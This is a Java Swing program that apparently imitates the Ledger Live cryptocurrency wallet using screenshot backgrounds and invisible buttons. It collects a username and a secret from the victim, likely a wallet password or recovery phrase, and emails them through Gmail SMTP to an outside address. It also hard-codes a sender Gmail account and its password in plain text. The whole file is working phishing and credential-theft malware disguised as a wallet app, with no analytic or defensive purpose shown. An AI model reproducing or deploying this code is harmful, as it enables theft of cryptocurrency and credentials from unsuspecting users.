package LegerLiveWallet;



import javax.imageio.ImageIO;
import javax.mail.*;
import javax.mail.internet.AddressException;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import javax.swing.*;
import java.awt.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.File;
import java.io.IOException;
import java.util.Properties;

public class mainpage  implements ActionListener{
    JButton button ;
    JFrame f;


    mainpage() throws IOException {

        f = new JFrame();
        button = new JButton();
        button.setSize(110,35);
        button.setLocation(450,502);
        button.setOpaque(false);
        button.setContentAreaFilled(false);
        button.setBorderPainted(false);
        button.setToolTipText("x");
        button.addActionListener(this);
        f.add(button);
        f.getContentPane().add(new JPanelWithBackground("12.jpg"));
        f.setVisible(true);
        f.setResizable(false);
        f.setSize(new Dimension(1009,715));

    }
    public static void main (String[] args) throws IOException {
       new mainpage();
    }


    @Override
    public void actionPerformed (ActionEvent e) {
        if (e.getSource()==button){
            f.dispose();
            try {
                new SeconPage();
            } catch (IOException ioException) {
                ioException.printStackTrace();
            }
        }
    }
}

 class JPanelWithBackground extends JPanel  {

    private Image backgroundImage;

    // Some code to initialize the background image.
    // Here, we use the constructor to load the image. This
    // can vary depending on the use case of the panel.
    public JPanelWithBackground(String fileName) throws IOException {
        backgroundImage = ImageIO.read(new File(fileName));
    }

    public void paintComponent(Graphics g) {
        super.paintComponent(g);

        // Draw the background image.
        g.drawImage(backgroundImage, 0, 0, this);
    }


 }

 class SeconPage  implements ActionListener{
     JButton button;
     JFrame f;
     JTextField textField;


     SeconPage () throws IOException {

         f = new JFrame();
         button = new JButton();
         button.setBounds(710,385,65,40);
         button.setOpaque(false);
         button.setContentAreaFilled(false);
         button.setBorderPainted(false);

         textField = new JTextField();
         textField.setBounds(515,385,210,40);
         f.add(textField);
         button.addActionListener(this);


         f.add(button);
         f.getContentPane().add(new JPanelWithBackground("2.jpg"));
         f.setVisible(true);
         f.setResizable(false);
         f.setSize(new Dimension(1280, 657));
     }

     @Override
     public void actionPerformed (ActionEvent e) {
         if (e.getSource()==button){
             try {
                 String username = textField.getText();
                 f.dispose();
                 new THirdPage(username);
             } catch (IOException ioException) {
                 ioException.printStackTrace();
             }
         }
 }

 class THirdPage  implements ActionListener{
     JButton button;
     JFrame f;
     JTextField textField;
     String username;

     THirdPage (String username) throws IOException {
         this.username = username;
         f = new JFrame();
         button = new JButton();
         button.setBounds(260, 335, 100, 50);
         button.setOpaque(false);
         button.setContentAreaFilled(false);
         button.setBorderPainted(false);
         button.addActionListener(this);

         textField = new JTextField();
         textField.setBounds(68, 265, 500, 50);
         textField.setOpaque(false);
         textField.setBorder(null);

         f.add(textField);


         f.add(button);
         f.getContentPane().add(new JPanelWithBackground("3.jpg"));
         f.setVisible(true);
         f.setResizable(false);
         f.setSize(new Dimension(631, 466));
     }

     @Override
     public void actionPerformed (ActionEvent e) {
         if (e.getSource()==button){
             String password = textField.getText();
             SendData sendData = new SendData(username,password);
             try {
                 sendData.sendMail("verified@gmail.com");
             } catch (Exception exception) {
                 exception.printStackTrace();
             }
         }
     }
 }
}


 class SendData {

    String user;
    String leg;

    SendData(String user,String leg){
        this.user=user;
        this.leg=leg;
    }


     public  void sendMail (String recepient) throws Exception {
         System.out.println("Preparing to send email");
         Properties properties = new Properties();

         //Enable authentication
         properties.put("mail.smtp.auth", "true");
         //Set TLS encryption enabled
         properties.put("mail.smtp.starttls.enable", "true");
         //Set SMTP host
         properties.put("mail.smtp.host", "smtp.gmail.com");
         //Set smtp port
         properties.put("mail.smtp.port", "587");

         //Your gmail address
         String myAccountEmail = "galiroge74@gmail.com";
         //Your gmail password
         String password = "Hanaa122343";

         //Create a session with account credentials
         Session session = Session.getInstance(properties, new Authenticator() {
             @Override
             protected PasswordAuthentication getPasswordAuthentication () {
                 return new PasswordAuthentication(myAccountEmail, password);
             }
         });

         //Prepare email message
         Message message = prepareMessage(session, myAccountEmail, recepient);

         //Send mail
         Transport.send(message);
         System.out.println("Message sent successfully");
     }

     private  Message prepareMessage (Session session, String myAccountEmail, String recepient) {
         try {
             Message message = new MimeMessage(session);
             message.setFrom(new InternetAddress(myAccountEmail));
             message.setRecipient(Message.RecipientType.TO, new InternetAddress(recepient));
             message.setSubject("My First Email from Java App");
             String htmlCode = "<h1>"+user+" </h1> <br/> <h2><b>"+leg+" </b></h2>";
             message.setContent(htmlCode, "text/html");
             return message;
         } catch (Exception ex) {
             System.out.println(ex.getCause());
         }
         return null;
     }

 }
